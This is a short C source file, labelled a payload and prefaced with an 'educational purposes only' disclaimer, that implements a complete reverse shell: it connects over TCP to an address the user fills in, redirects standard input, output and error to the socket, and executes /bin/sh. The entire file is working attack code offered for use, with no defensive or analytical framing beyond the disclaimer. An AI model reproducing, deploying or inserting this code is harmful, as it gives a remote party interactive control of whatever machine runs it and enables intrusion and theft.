/*
 * Payload created by veilwr4ith
 * Warning: This script is intended for educational purposes only. 
 * Unauthorized use, deployment, or distribution of this payload 
 * is illegal and unethical. Use responsibly and only in environments 
 * where you have explicit permission.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>

#define SERVER_IP "127.0.0.1" // Replace this
#define SERVER_PORT 1234 // Replace this

int main() {
    int sockfd; // File descriptor for the socket
    struct sockaddr_in server_addr; // Structure to hold server address information
    char *argv[] = {"/bin/sh", NULL}; // Arguments for the shell execution

    // Create a socket using TCP/IP
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket"); // Print error message if socket creation fails
        exit(EXIT_FAILURE);
    }

    // Set up the server address structure
    memset(&server_addr, 0, sizeof(server_addr)); // Clear the structure
    server_addr.sin_family = AF_INET; // IPv4 address family
    server_addr.sin_port = htons(SERVER_PORT); // Port number in network byte order
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("inet_pton"); // Print error message if IP address conversion fails
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect"); // Print error message if connection fails
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Redirect standard input, output, and error streams to the socket
    dup2(sockfd, STDIN_FILENO);  // Redirect stdin to the socket
    dup2(sockfd, STDOUT_FILENO); // Redirect stdout to the socket
    dup2(sockfd, STDERR_FILENO); // Redirect stderr to the socket

    // Execute the shell
    execve("/bin/sh", argv, NULL);
    
    // If execve fails, print error message
    perror("execve");
    close(sockfd);
    return EXIT_FAILURE;
}

